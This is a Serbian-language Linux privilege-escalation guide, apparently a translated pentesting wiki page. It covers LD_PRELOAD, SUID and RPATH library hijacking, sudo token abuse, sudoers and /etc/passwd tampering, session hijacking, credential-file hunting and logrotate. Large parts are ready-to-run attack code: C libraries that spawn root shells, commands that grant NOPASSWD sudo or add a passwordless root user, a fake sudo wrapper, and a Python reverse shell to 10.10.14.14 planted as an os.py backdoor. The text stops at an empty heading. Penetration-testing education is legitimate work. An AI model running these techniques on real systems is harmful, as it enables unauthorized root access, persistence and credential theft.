Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (.so datoteka) koje loader treba da učita pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces poznat je kao preloading biblioteke.

Međutim, radi održavanja bezbednosti sistema i sprečavanja zloupotrebe ove funkcije, naročito kod **suid/sgid** izvršnih datoteka, sistem primenjuje određene uslove:

- Loader ignoriše **LD_PRELOAD** kod izvršnih datoteka kod kojih se stvarni ID korisnika (_ruid_) ne podudara sa efektivnim ID-om korisnika (_euid_).
- Kod izvršnih datoteka sa suid/sgid, preloaduju se samo biblioteke iz standardnih putanja koje takođe imaju suid/sgid.

Eskalacija privilegija može nastati ako imate mogućnost izvršavanja komandi pomoću `sudo`, a izlaz komande `sudo -l` uključuje iskaz **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** ostane prisutna i bude prepoznata čak i kada se komande izvršavaju pomoću `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim ga **kompajlirajte** pomoću:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može da se zloupotrebi ako napadač kontroliše **LD_LIBRARY_PATH** env promenljivu, jer kontroliše putanju u kojoj će se biblioteke tražiti.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neuobičajeno, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailaženje na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za exploitaciju.

Da bi se ovo iskoristilo, potrebno je kreirati C datoteku, na primer _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon kompajliranja i izvršavanja, ima za cilj podizanje privilegija manipulisanjem dozvolama datoteka i izvršavanjem shell-a sa povišenim privilegijama.

Kompajlirajte gornju C datoteku u shared object (.so) datoteku pomoću:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođenog SUID binary-ja treba da aktivira exploit, što može omogućiti kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava library iz foldera u koji možemo da pišemo, hajde da kreiramo library u tom folderu sa neophodnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju koja se zove `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je pažljivo odabrana lista Unix binarnih datoteka koje napadač može da iskoristi za zaobilaženje lokalnih bezbednosnih ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete da **ubacujete samo argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih datoteka koje se mogu zloupotrebiti za izlazak iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, prenos datoteka, pokretanje bind i reverse shell-ova i obavljanje drugih zadataka nakon eksploatacije.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite komandi `sudo -l`, možete da upotrebite alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način za iskorišćavanje nekog sudo pravila.

### Ponovna upotreba Sudo tokena

U slučajevima kada imate **sudo access**, ali ne i lozinku, možete da eskalirate privilegije tako što ćete **sačekati izvršavanje sudo komande, a zatim preuzeti token sesije**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** za izvršavanje nečega u **poslednjih 15 minuta** (podrazumevano je to trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez ponovnog unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (morate biti u mogućnosti da ga otpremite)

(`ptrace_scope` možete privremeno da omogućite pomoću `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajnom izmenom `/etc/sysctl.d/10-ptrace.conf` i postavljanjem vrednosti `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete da eskalirate privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) će kreirati binarnu datoteku `activate_sudo_token` u direktorijumu _/tmp_. Možete je koristiti za **aktiviranje sudo tokena u svojoj sesiji** (nećete automatski dobiti root shell, pokrenite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root korisnika sa setuid bitom**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers datoteku** koja čini **sudo tokene večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **dozvole za upis** u fascikli ili nad bilo kojim kreiranim fajlom unutar fascikle, možete koristiti binarni fajl [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete da prepišete fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku, tako što ćete izvršiti:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i na koji način. Ove fajlove **podrazumevano mogu da čitaju samo korisnik root i grupa root**.\
**Ako** možete da **čitate** ovaj fajl, možda ćete moći da **dobijete neke zanimljive informacije**, a ako možete da **upisujete** u bilo koji fajl, moći ćete da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete da pišete, možete zloupotrebiti ovu dozvolu
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način za zloupotrebu ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative binarnoj datoteci `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite njenu konfiguraciju u `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Ako `doas` dozvoljava editor ili interpreter, proverite GTFOBins-style escape mehanizme:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija, a dobili ste shell u kontekstu tog korisnika, možete **kreirati novu sudo izvršnu datoteku** koja će izvršiti vaš kod kao root, a zatim i korisnikovu komandu. Zatim, **izmenite $PATH** konteksta korisnika (na primer, dodavanjem nove putanje u .bash_profile), tako da se prilikom izvršavanja komande sudo pokrene vaša sudo izvršna datoteka.

Imajte na umu da ćete, ako korisnik koristi drugačiji shell (ne bash), morati da izmenite druge datoteke kako biste dodali novu putanju. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` ukazuje na **to odakle potiču učitane konfiguracione datoteke**. Obično ova datoteka sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **ukazuju na druge fascikle** u kojima će se **pretraživati** **biblioteke**. Na primer, sadržaj datoteke `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem pretraživati biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** nad bilo kojom od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojom datotekom unutar `/etc/ld.so.conf.d/` ili bilo kojom fasciklom navedenom u konfiguracionoj datoteci unutar `/etc/ld.so.conf.d/*.conf`, on može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako da iskoristite ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem biblioteke u `/var/tmp/flag15/`, program će je koristiti sa ove lokacije, kao što je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities obezbeđuju **podskup dostupnih root privilegija procesu**. Ovo efektivno deli root **privilegije na manje i zasebne jedinice**. Svaka od ovih jedinica može nezavisno da se dodeli procesima. Na ovaj način se smanjuje ukupan skup privilegija, čime se umanjuju rizici od exploitation-a.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i načinima njihove zloupotrebe**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, bit za **"execute"** podrazumeva da pogođeni korisnik može da uradi "**cd**" u folder.\
Bit za **"read"** podrazumeva da korisnik može da **izlista** **fajlove**, dok bit za **"write"** podrazumeva da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj discretionary dozvola, koji može da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole unapređuju kontrolu pristupa fajlovima ili direktorijumima tako što omogućavaju ili uskraćuju prava određenim korisnicima koji nisu vlasnici niti su deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dodatne informacije možete pronaći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodelite** korisniku "kali" read i write dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Preuzmite** fajlove sa određenim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Skriveni ACL backdoor u sudoers drop-in fajlovima

Česta pogrešna konfiguracija je fajl u `/etc/sudoers.d/` u vlasništvu root-a, sa režimom `440`, koji i dalje ACL-om daje low-priv korisniku pristup za upis.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ako vidite nešto poput `user:alice:rw-`, korisnik može da doda sudo pravilo uprkos restriktivnim bitovima režima:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ovo je ACL putanja za persistence/privesc sa velikim uticajem, jer se lako može prevideti tokom provera koje se oslanjaju samo na `ls -l`.

## Otvorene shell sesije

U **starijim verzijama** možda možete **preuzeti** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **povežete** samo na screen sesije **sopstvenog korisnika**. Međutim, unutar **sesije** možete pronaći **zanimljive informacije**.

### Preuzimanje screen sesija

**Izlistajte screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![otmica screen sesija - Lokacije socket-a (neki sistemi jedan izlažu kao simboličku vezu ka drugom): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Povežite se sa sesijom**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam uspeo da otmem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovani korisnik.

**Izlistaj tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Lokacije socket-a (neki sistemi izlažu jedan kao symbolic link drugog) - hijacking tmux sesija: tmux -S /tmp/dev sess ls Lista pomoću tog socket-a; možete pokrenuti tmux sesiju na tom socket-u...](<../../images/image (837).png>)

**Povežite se sa sesijom**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Pogledajte **Valentine box from HTB** kao primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu itd.) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bugom.\
Ovaj bug nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da **pomoću ssh javnog ključa možete pronaći odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Zanimljive vrednosti SSH konfiguracije

- **PasswordAuthentication:** Navodi da li je autentikacija lozinkom dozvoljena. Podrazumevana vrednost je `no`.
- **PubkeyAuthentication:** Navodi da li je autentikacija javnim ključem dozvoljena. Podrazumevana vrednost je `yes`.
- **PermitEmptyPasswords**: Kada je autentikacija lozinkom dozvoljena, navodi da li server dozvoljava prijavljivanje na naloge sa praznim lozinkama. Podrazumevana vrednost je `no`.

### Fajlovi za kontrolu prijavljivanja

Ovi fajlovi utiču na to ko može da se prijavi i na koji način:

- **`/etc/nologin`**: ako postoji, blokira prijavljivanje korisnika koji nisu root i ispisuje svoju poruku.
- **`/etc/securetty`**: ograničava gde root može da se prijavi (TTY allowlist).
- **`/etc/motd`**: banner nakon prijavljivanja (može otkriti informacije o okruženju ili održavanju).

### PermitRootLogin

Navodi da li root može da se prijavi koristeći ssh; podrazumevana vrednost je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` ili `prohibit-password`: root može da se prijavi samo pomoću privatnog ključa
- `forced-commands-only`: Root može da se prijavi samo pomoću privatnog ključa i ako su navedene opcije za komande
- `no` : ne

### AuthorizedKeysFile

Navodi fajlove koji sadrže javne ključeve koji se mogu koristiti za autentikaciju korisnika. Može sadržati tokene poput `%h`, koji će biti zamenjeni početnim direktorijumom. **Možete navesti apsolutne putanje** (koje počinju znakom `/`) ili **relativne putanje u odnosu na početni direktorijum korisnika**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati na to da će, ako pokušate da se prijavite pomoću **privatnog** ključa korisnika "**testusername**", ssh uporediti javni ključ vašeg ključa sa ključevima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding omogućava da **koristite svoje lokalne SSH ključeve umesto da ključeve** (bez passphrase-a!) ostavljate na serveru. Tako ćete moći da **jump** putem ssh-a **na host** i odatle **jump** na drugi host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Ovu opciju treba da podesite u `$HOME/.ssh.config` na sledeći način:
```
Host example.com
ForwardAgent yes
```
Imajte na umu da će, ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugu mašinu ta mašina moći da pristupi ključevima (što predstavlja bezbednosni problem).

Datoteka `/etc/ssh_config` može da **nadjača** ove **opcije** i dozvoli ili zabrani ovu konfiguraciju.\
Datoteka `/etc/sshd_config` može da **dozvoli** ili **zabrani** prosleđivanje ssh-agent-a pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako utvrdite da je Forward Agent konfigurisan u nekom okruženju, pročitajte sledeću stranicu jer ćete **možda moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljive datoteke

### Datoteke profila

Datoteka `/etc/profile` i datoteke unutar `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi `shell`**. Zbog toga, ako možete da **upišete sadržaj u bilo koju od njih ili da je izmenite, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe bilo kakva neobična profilna skripta, trebalo bi da je proverite zbog **osetljivih detalja**.

### Passwd/Shadow datoteke

U zavisnosti od OS-a, datoteke `/etc/passwd` i `/etc/shadow` mogu koristiti drugačiji naziv ili može postojati rezervna kopija. Zato se preporučuje da **pronađete sve** i **proverite da li možete da ih čitate** kako biste utvrdili **da li se u datotekama nalaze hash vrednosti**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **hash vrednosti lozinki** unutar datoteke `/etc/passwd` (ili ekvivalentne datoteke)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije za dodavanje dummy korisnika bez lozinke.\
UPOZORENJE: možete narušiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, dok je `/etc/shadow` preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, da li možete da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete da **izmenite Tomcat service configuration file unutar /etc/systemd/,** tada možete da izmenite linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada tomcat bude pokrenut.

### Provera direktorijuma

Sledeći direktorijumi mogu sadržati backup-e ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/fajlovi u vlasništvu
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skrivene datoteke
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/binarne datoteke u PATH-u**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web datoteke**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznati fajlovi koji sadrže lozinke

Pročitajte kod alata [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), koji pretražuje **nekoliko mogućih fajlova koji mogu sadržati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti u tu svrhu jeste: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), aplikacija otvorenog koda koja se koristi za pronalaženje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.

### Dnevnici

Ako možete da čitate dnevnike, možda ćete u njima pronaći **zanimljive/poverljive informacije**. Što je dnevnik neobičniji, to će verovatno biti zanimljiviji.\
Takođe, neki neispravno konfigurisani (sa backdoor-om?) **audit dnevnici** mogu omogućiti da **beležite lozinke** unutar audit dnevnika, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste mogli da **čitate logove, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell datoteke
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe bi trebalo da proverite fajlove koji sadrže reč "**password**" u svom **imenu** ili unutar **sadržaja**, kao i da proverite IP adrese i adrese e-pošte unutar logova, odnosno regex izraze za hash-eve.\
Ovde neću navoditi kako se sve ovo radi, ali ako vas zanima, možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Fajlovi sa dozvolom upisa

### Python library hijacking

Ako znate **odakle** će python skripta biti izvršena i **možete pisati unutar** te fascikle ili možete **menjati python biblioteke**, možete izmeniti OS biblioteku i ubaciti backdoor u nju (ako možete pisati tamo gde će python skripta biti izvršena, kopirajte i nalepite os.py biblioteku).

Da biste **ubacili backdoor u biblioteku**, samo dodajte sledeću liniju na kraj os.py biblioteke (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacija logrotate-a

Ranjivost u `logrotate` omogućava korisnicima sa **write permissions** nad log fajlom ili njegovim nadređenim direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate` često pokreće kao **root** i može biti manipulisano njegovim ponašanjem tako da izvršava proizvoljne fajlove, naročito u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_, već i u svakom direktorijumu u kom se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verzije `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete eksploatisati pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična ranjivosti [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god pronađete da možete menjati logove, proverite ko upravlja tim logovima i da li možete eskalirati privilegije tako što ćete logove zameniti symlink-ovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

